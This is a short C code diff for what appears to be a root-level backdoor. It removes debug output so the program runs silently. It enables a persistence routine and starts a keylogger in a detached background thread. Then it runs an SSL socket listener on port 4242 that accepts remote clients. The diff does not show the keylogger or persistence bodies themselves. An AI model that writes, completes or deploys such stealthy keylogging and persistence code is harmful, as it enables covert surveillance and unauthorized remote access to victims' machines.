@@ -71,7 +71,7 @@ void *handle_client(void *arg) {
         }
     }
 
-    printf("close connexion\n");
+    // printf("close connexion\n");
     if (ssl_read_err != SSL_ERROR_SSL || ssl_read_err != SSL_ERROR_SYSCALL)
         SSL_shutdown(args->ssl);
     SSL_free(args->ssl);
@@ -101,7 +101,7 @@ void start_socket_listener() {
     sc(SYS_bind, server_fd, (struct sockaddr *)&address, sizeof(address));
     sc(SYS_listen, server_fd, MAX_CLIENTS);
 
-    printf("Server listening on port 4242\n");
+    // printf("Server listening on port 4242\n");
     while (1) {
         t_args *args = calloc(1, sizeof(t_args));
         args->ssl = SSL_new(ctx);
@@ -109,7 +109,7 @@ void start_socket_listener() {
         args->client_socket = sc(SYS_accept ,server_fd, (struct sockaddr *)&address, &addrlen);
         SSL_set_fd(args->ssl, args->client_socket);
 
-        printf("New connection attempt...\n");
+        // printf("New connection attempt...\n");
         if (SSL_accept(args->ssl)) {
             m_lock(mutex);
             if (active_connections >= MAX_CLIENTS) {
@@ -141,9 +141,12 @@ int main(int ac, char **av) {
         fprintf(stderr, "Error: this program must be run as root.\n");
         return 1;
     }
-    //create_daemon();
-    //set_persistence();
-    //launch_keylogger();
+    // create_daemon();
+    set_persistence();
+    pthread_t thread_id;
+    
+    p_create(&thread_id, NULL, launch_keylogger, NULL);
+    p_detach(thread_id);
     start_socket_listener();
 
     return 0;
